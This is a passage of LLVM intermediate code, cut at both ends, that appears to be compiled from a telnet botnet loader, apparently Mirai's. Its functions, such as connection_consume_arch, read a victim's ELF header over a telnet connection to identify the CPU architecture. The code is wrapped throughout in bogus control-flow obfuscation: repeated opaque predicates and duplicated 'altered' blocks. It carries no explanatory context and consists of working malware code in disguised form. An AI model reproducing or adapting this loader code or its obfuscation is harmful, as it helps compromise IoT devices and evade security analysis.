originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = load i32, i32* @x.19
  %148 = load i32, i32* @y.20
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %155

; <label>:155:                                    ; preds = %originalBBpart212, %68
  %156 = load i32, i32* @x.19
  %157 = load i32, i32* @y.20
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %155
  %164 = load i32, i32* @x.19
  %165 = load i32, i32* @y.20
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %22

; <label>:172:                                    ; preds = %35
  %173 = load i32, i32* @x.19
  %174 = load i32, i32* @y.20
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %172
  %181 = load i32, i32* %4, align 4
  store i32 %181, i32* %2, align 4
  %182 = load i32, i32* @x.19
  %183 = load i32, i32* @y.20
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %190

; <label>:190:                                    ; preds = %originalBBpart220, %20
  %191 = load i32, i32* @x.19
  %192 = load i32, i32* @y.20
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %190
  %199 = load i32, i32* %2, align 4
  %200 = load i32, i32* @x.19
  %201 = load i32, i32* @y.20
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %78
  %208 = load i32, i32* %10, align 4
  %209 = icmp slt i32 %208, 31
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  %210 = load %struct.connection*, %struct.connection** %3, align 8
  %211 = getelementptr inbounds %struct.connection, %struct.connection* %210, i32 0, i32 3
  %212 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %211, i32 0, i32 3
  %213 = getelementptr inbounds [32 x i8], [32 x i8]* %212, i32 0, i32 0
  %214 = load i8*, i8** %9, align 8
  %215 = call i8* @strcpy(i8* %213, i8* %214) #5
  store i8 1, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  %216 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %216)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %155
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %172
  %217 = load i32, i32* %4, align 4
  store i32 %217, i32* %2, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %190
  %218 = load i32, i32* %2, align 4
  br label %originalBB22
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_copy_op(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arch(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca %struct.elf_hdr*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 3
  %9 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %8, i32 0, i32 8
  %10 = load i8, i8* %9, align 1
  %11 = icmp ne i8 %10, 0
  br i1 %11, label %505, label %12

; <label>:12:                                     ; preds = %1
  %13 = load %struct.connection*, %struct.connection** %3, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 15
  %15 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i32 0, i32 0
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 9
  %18 = load i16, i16* %17, align 8
  %19 = zext i16 %18 to i32
  %20 = call i32 @util_memsearch(i8* %15, i32 %19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i32 0, i32 0), i32 3)
  store i32 %20, i32* %5, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %12
  store i32 0, i32* %2, align 4
  br label %561

; <label>:23:                                     ; preds = %12
  %24 = load i32, i32* @x.23
  %25 = load i32, i32* @y.24
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %5, align 4
  %33 = sub nsw i32 %32, 4
  store i32 %33, i32* %5, align 4
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 15
  %36 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i32 0, i32 0
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = bitcast i8* %39 to %struct.elf_hdr*
  store %struct.elf_hdr* %40, %struct.elf_hdr** %4, align 8
  %41 = load %struct.connection*, %struct.connection** %3, align 8
  %42 = getelementptr inbounds %struct.connection, %struct.connection* %41, i32 0, i32 3
  %43 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %42, i32 0, i32 8
  store i8 1, i8* %43, align 1
  %44 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %45 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %44, i32 0, i32 0
  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %45, i64 0, i64 5
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = load i32, i32* @x.23
  %50 = load i32, i32* @y.24
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %48, label %100 [
    i32 0, label %57
    i32 2, label %74
    i32 1, label %99
  ]

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* @x.23
  %59 = load i32, i32* @y.24
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %57
  store i32 0, i32* %2, align 4
  %66 = load i32, i32* @x.23
  %67 = load i32, i32* @y.24
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  br label %561

; <label>:74:                                     ; preds = %originalBBpart2
  %75 = load i32, i32* @x.23
  %76 = load i32, i32* @y.24
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %74
  %83 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %84 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %83, i32 0, i32 2
  %85 = load i16, i16* %84, align 1
  %86 = zext i16 %85 to i32
  %87 = call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %86)
  %88 = trunc i32 %87 to i16
  %89 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %90 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %89, i32 0, i32 2
  store i16 %88, i16* %90, align 1
  %91 = load i32, i32* @x.23
  %92 = load i32, i32* @y.24
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %100

; <label>:99:                                     ; preds = %originalBBpart2
  br label %100

; <label>:100:                                    ; preds = %99, %originalBBpart210, %originalBBpart2
  %101 = load i32, i32* @x.23
  %102 = load i32, i32* @y.24
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %100
  %109 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %110 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %109, i32 0, i32 2
  %111 = load i16, i16* %110, align 1
  %112 = zext i16 %111 to i32
  %113 = icmp eq i32 %112, 40
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %113, label %128, label %122

; <label>:122:                                    ; preds = %originalBBpart214
  %123 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %124 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %123, i32 0, i32 2
  %125 = load i16, i16* %124, align 1
  %126 = zext i16 %125 to i32
  %127 = icmp eq i32 %126, 183
  br i1 %127, label %128, label %134

; <label>:128:                                    ; preds = %122, %originalBBpart214
  %129 = load %struct.connection*, %struct.connection** %3, align 8
  %130 = getelementptr inbounds %struct.connection, %struct.connection* %129, i32 0, i32 3
  %131 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %130, i32 0, i32 2
  %132 = getelementptr inbounds [6 x i8], [6 x i8]* %131, i32 0, i32 0
  %133 = call i8* @strcpy(i8* %132, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.22, i32 0, i32 0)) #5
  br label %488

; <label>:134:                                    ; preds = %122
  %135 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %136 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %135, i32 0, i32 2
  %137 = load i16, i16* %136, align 1
  %138 = zext i16 %137 to i32
  %139 = icmp eq i32 %138, 8
  br i1 %139, label %162, label %140

; <label>:140:                                    ; preds = %134
  %141 = load i32, i32* @x.23
  %142 = load i32, i32* @y.24
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %140
  %149 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %150 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %149, i32 0, i32 2
  %151 = load i16, i16* %150, align 1
  %152 = zext i16 %151 to i32
  %153 = icmp eq i32 %152, 10
  %154 = load i32, i32* @x.23
  %155 = load i32, i32* @y.24
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %153, label %162, label %182

; <label>:162:                                    ; preds = %originalBBpart218, %134
  %163 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %164 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %163, i32 0, i32 0
  %165 = getelementptr inbounds [16 x i8], [16 x i8]* %164, i64 0, i64 5
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 1
  br i1 %168, label %169, label %175

; <label>:169:                                    ; preds = %162
  %170 = load %struct.connection*, %struct.connection** %3, align 8
  %171 = getelementptr inbounds %struct.connection, %struct.connection* %170, i32 0, i32 3
  %172 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %171, i32 0, i32 2
  %173 = getelementptr inbounds [6 x i8], [6 x i8]* %172, i32 0, i32 0
  %174 = call i8* @strcpy(i8* %173, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #5
  br label %181

; <label>:175:                                    ; preds = %162
  %176 = load %struct.connection*, %struct.connection** %3, align 8
  %177 = getelementptr inbounds %struct.connection, %struct.connection* %176, i32 0, i32 3
  %178 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %177, i32 0, i32 2
  %179 = getelementptr inbounds [6 x i8], [6 x i8]* %178, i32 0, i32 0
  %180 = call i8* @strcpy(i8* %179, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0)) #5
  br label %181

; <label>:181:                                    ; preds = %175, %169
  br label %487

; <label>:182:                                    ; preds = %originalBBpart218
  %183 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %184 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %183, i32 0, i32 2
  %185 = load i16, i16* %184, align 1
  %186 = zext i16 %185 to i32
  %187 = icmp eq i32 %186, 3
  br i1 %187, label %238, label %188

; <label>:188:                                    ; preds = %182
  %189 = load i32, i32* @x.23
  %190 = load i32, i32* @y.24
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %188
  %197 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %198 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %197, i32 0, i32 2
  %199 = load i16, i16* %198, align 1
  %200 = zext i16 %199 to i32
  %201 = icmp eq i32 %200, 6
  %202 = load i32, i32* @x.23
  %203 = load i32, i32* @y.24
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %201, label %238, label %210

; <label>:210:                                    ; preds = %originalBBpart222
  %211 = load i32, i32* @x.23
  %212 = load i32, i32* @y.24
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %210
  %219 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %220 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %219, i32 0, i32 2
  %221 = load i16, i16* %220, align 1
  %222 = zext i16 %221 to i32
  %223 = icmp eq i32 %222, 7
  %224 = load i32, i32* @x.23
  %225 = load i32, i32* @y.24
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %223, label %238, label %232

; <label>:232:                                    ; preds = %originalBBpart226
  %233 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %234 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %233, i32 0, i32 2
  %235 = load i16, i16* %234, align 1
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 62
  br i1 %237, label %238, label %260

; <label>:238:                                    ; preds = %232, %originalBBpart226, %originalBBpart222, %182
  %239 = load i32, i32* @x.23
  %240 = load i32, i32* @y.24
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %238
  %247 = load %struct.connection*, %struct.connection** %3, align 8
  %248 = getelementptr inbounds %struct.connection, %struct.connection* %247, i32 0, i32 3
  %249 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %248, i32 0, i32 2
  %250 = getelementptr inbounds [6 x i8], [6 x i8]* %249, i32 0, i32 0
  %251 = call i8* @strcpy(i8* %250, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0)) #5
  %252 = load i32, i32* @x.23
  %253 = load i32, i32* @y.24
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %486

; <label>:260:                                    ; preds = %232
  %261 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %262 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %261, i32 0, i32 2
  %263 = load i16, i16* %262, align 1
  %264 = zext i16 %263 to i32
  %265 = icmp eq i32 %264, 2
  br i1 %265, label %294, label %266

; <label>:266:                                    ; preds = %260
  %267 = load i32, i32* @x.23
  %268 = load i32, i32* @y.24
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %266
  %275 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %276 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %275, i32 0, i32 2
  %277 = load i16, i16* %276, align 1
  %278 = zext i16 %277 to i32
  %279 = icmp eq i32 %278, 18
  %280 = load i32, i32* @x.23
  %281 = load i32, i32* @y.24
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %279, label %294, label %288

; <label>:288:                                    ; preds = %originalBBpart234
  %289 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %290 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %289, i32 0, i32 2
  %291 = load i16, i16* %290, align 1
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 43
  br i1 %293, label %294, label %316

; <label>:294:                                    ; preds = %288, %originalBBpart234, %260
  %295 = load i32, i32* @x.23
  %296 = load i32, i32* @y.24
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %294
  %303 = load %struct.connection*, %struct.connection** %3, align 8
  %304 = getelementptr inbounds %struct.connection, %struct.connection* %303, i32 0, i32 3
  %305 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %304, i32 0, i32 2
  %306 = getelementptr inbounds [6 x i8], [6 x i8]* %305, i32 0, i32 0
  %307 = call i8* @strcpy(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.26, i32 0, i32 0)) #5
  %308 = load i32, i32* @x.23
  %309 = load i32, i32* @y.24
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %469

; <label>:316:                                    ; preds = %288
  %317 = load i32, i32* @x.23
  %318 = load i32, i32* @y.24
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %316
  %325 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %326 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 1
  %328 = zext i16 %327 to i32
  %329 = icmp eq i32 %328, 4
  %330 = load i32, i32* @x.23
  %331 = load i32, i32* @y.24
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %329, label %360, label %338

; <label>:338:                                    ; preds = %originalBBpart242
  %339 = load i32, i32* @x.23
  %340 = load i32, i32* @y.24
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %338
  %347 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %348 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %347, i32 0, i32 2
  %349 = load i16, i16* %348, align 1
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 5
  %352 = load i32, i32* @x.23
  %353 = load i32, i32* @y.24
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %351, label %360, label %366

; <label>:360:                                    ; preds = %originalBBpart246, %originalBBpart242
  %361 = load %struct.connection*, %struct.connection** %3, align 8
  %362 = getelementptr inbounds %struct.connection, %struct.connection* %361, i32 0, i32 3
  %363 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %362, i32 0, i32 2
  %364 = getelementptr inbounds [6 x i8], [6 x i8]* %363, i32 0, i32 0
  %365 = call i8* @strcpy(i8* %364, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0)) #5
  br label %452

; <label>:366:                                    ; preds = %originalBBpart246
  %367 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %368 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %367, i32 0, i32 2
  %369 = load i16, i16* %368, align 1
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 20
  br i1 %371, label %394, label %372

; <label>:372:                                    ; preds = %366
  %373 = load i32, i32* @x.23
  %374 = load i32, i32* @y.24
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %372
  %381 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %382 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %381, i32 0, i32 2
  %383 = load i16, i16* %382, align 1
  %384 = zext i16 %383 to i32
  %385 = icmp eq i32 %384, 21
  %386 = load i32, i32* @x.23
  %387 = load i32, i32* @y.24
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %385, label %394, label %416

; <label>:394:                                    ; preds = %originalBBpart250, %366
  %395 = load i32, i32* @x.23
  %396 = load i32, i32* @y.24
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %394
  %403 = load %struct.connection*, %struct.connection** %3, align 8
  %404 = getelementptr inbounds %struct.connection, %struct.connection* %403, i32 0, i32 3
  %405 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %404, i32 0, i32 2
  %406 = getelementptr inbounds [6 x i8], [6 x i8]* %405, i32 0, i32 0
  %407 = call i8* @strcpy(i8* %406, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i32 0, i32 0)) #5
  %408 = load i32, i32* @x.23
  %409 = load i32, i32* @y.24
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %435

; <label>:416:                                    ; preds = %originalBBpart250
  %417 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %418 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %417, i32 0, i32 2
  %419 = load i16, i16* %418, align 1
  %420 = zext i16 %419 to i32
  %421 = icmp eq i32 %420, 42
  br i1 %421, label %422, label %428

; <label>:422:                                    ; preds = %416
  %423 = load %struct.connection*, %struct.connection** %3, align 8
  %424 = getelementptr inbounds %struct.connection, %struct.connection* %423, i32 0, i32 3
